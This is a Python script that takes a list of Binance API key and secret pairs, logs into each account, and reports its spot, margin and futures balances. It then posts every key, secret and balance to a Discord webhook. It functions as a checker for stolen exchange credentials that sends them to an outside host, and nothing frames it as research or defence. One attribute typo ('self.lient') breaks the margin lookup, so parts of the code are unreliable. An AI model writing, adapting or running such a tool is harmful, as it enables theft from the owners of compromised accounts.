from binance.client import Client
from binance.exceptions import BinanceAPIException
import threading, os, requests, time

tokens = open("./tokens.txt", "+r", encoding="utf-8").read().splitlines()
DISCORD_WEBHOOK = ""

class color:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BACK = '\033[1A'

def crywashere(content):
    url = DISCORD_WEBHOOK
    data = {
        "content" : content,
        "username" : "cry"
    }

    try:
        result = requests.post(url, json = data)
    except:
        pass

class ClientHelper:
    def __init__(self, client):
        self.client = client

    def _format(self, value, decimal=2):
        return format(float(value), ".2f")

    def transfer_futures_to_spot(self, amount):
        self.client.futures_account_transfer(asset="USDT", amount=float(amount), type="2")

    def transfer_spot_to_futures(self, amount):
        self.client.futures_account_transfer(asset="USDT", amount=float(amount), type="1")

    def transfer_spot_to_margin(self, amount):
        self.client.transfer_spot_to_margin(asset="USDT", amount=float(amount), type="1")

    def get_balance_margin_USDT(self):
        try:
            _len = len(self.client.get_margin_account()["userAssets"])
            for x in range(_len):
                if self.client.get_margin_account()["userAssets"][x]["asset"] == "USDT":
                    balance_USDT = self.lient.get_margin_account()["userAssets"][x]["free"]
                    return float(balance_USDT)
        except:
            pass

        return 0

    def spot_balance(self):
        sum_btc = 0.0
        balances = self.client.get_account()
        for _balance in balances["balances"]:
            asset = _balance["asset"]
            if float(_balance["free"]) != 0.0 or float(_balance["locked"]) != 0.0:
                try:
                    btc_quantity = float(_balance["free"]) + float(_balance["locked"])
                    if asset == "BTC":
                        sum_btc += btc_quantity
                    else:
                        _price = self.client.get_symbol_ticker(symbol=asset + "BTC")
                        sum_btc += btc_quantity * float(_price["price"])
                except:
                    pass

        current_btc_price_USD = self.client.get_symbol_ticker(symbol="BTCUSDT")["price"]
        own_usd = sum_btc * float(current_btc_price_USD)
        print("[SPOT] : %.8f BTC : " % sum_btc, end="")
        print("%.8f USDT" % own_usd)

    def get_futures_usdt(self, is_both=True) -> float:
        futures_usd = 0.0
        for asset in self.client.futures_account_balance():
            name = asset["asset"]
            balance = float(asset["balance"])
            if name == "USDT":
                futures_usd += balance

            if name == "BNB" and is_both:
                current_bnb_price_USD = self.client.get_symbol_ticker(symbol="BNBUSDT")["price"]
                futures_usd += balance * float(current_bnb_price_USD)

        return float(futures_usd)

    def _get_futures_usdt(self):
        """USDT in Futures, unRealizedProfit is also included"""
        futures_usd = self.get_futures_usdt(is_both=False)
        futures = self.client.futures_position_information()
        for future in futures:
            if future["positionAmt"] != "0" and float(future["unRealizedProfit"]) != 0.00000000:
                futures_usd += float(future["unRealizedProfit"])

        return format(futures_usd, ".2f")




def check(key_1: str, key_2: str):
    client = Client(key_1, key_2)
    client_helper = ClientHelper(client)
    balances = client.get_account()
    print(f"{color.GREEN}---------------------------------------------------------------{color.RESET}\nAPI_KEY: {key_1}\nSECRET_KEY: {key_2}\n")
    for balance in balances['balances']:
        
        
        if balance["asset"] == "USDT":
            usdt_balance = balance["free"]
            #break
        

        if float(balance['free']) > 0:
            print(f"[{balance['asset']}]:  {balance['free']} ")
    try:
        margin_usdt = client_helper.get_balance_margin_USDT()
        print(margin_usdt)
        futures_usd = client_helper._get_futures_usdt()
        futures_usd = client_helper._get_futures_usdt()
        print(f" [Futures]: {futures_usd} USD\n[SPOT]: {client_helper._format(usdt_balance)} USD\n[MARGIN]: {margin_usdt} USD ")

        client_helper.spot_balance()
        crywashere(f"````APIKEY: {key_1}\nSECRETKEY:{key_2}\n[Futures]: {futures_usd} USD\n[SPOT]: {client_helper._format(usdt_balance)} USD\n[MARGIN]: {margin_usdt} USD```")
    #print(f"{color.GREEN}---------------------------------------------------------------{color.RESET}\n")
    except:
        crywashere(f"```APIKEY: {key_1}\nSECRETKEY:{key_2}\n```")
        pass


if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    for token in tokens:
        check(token.split(":")[0], token.split(":")[1])

    print(f"{color.GREEN}---------------------------------------------------------------{color.RESET}\n")
    print("FINISHED")
    input(".....")